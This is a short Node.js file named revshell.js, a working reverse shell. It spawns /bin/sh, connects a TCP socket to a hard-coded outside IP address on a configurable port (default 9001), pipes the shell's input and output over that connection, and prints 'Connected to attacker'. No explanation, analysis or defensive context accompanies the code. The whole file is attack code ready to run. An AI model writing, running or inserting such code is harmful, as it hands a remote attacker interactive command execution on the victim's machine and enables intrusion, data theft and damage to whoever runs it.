// revshell.js
import net from 'net';
import { spawn } from 'child_process';

const port = process.argv[2] ? parseInt(process.argv[2], 10) : 9001;
const ip = '86.178.225.29';

const sh = spawn('/bin/sh');
const client = new net.Socket();

client.connect(port, ip, () => {
  console.log('Connected to attacker');
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
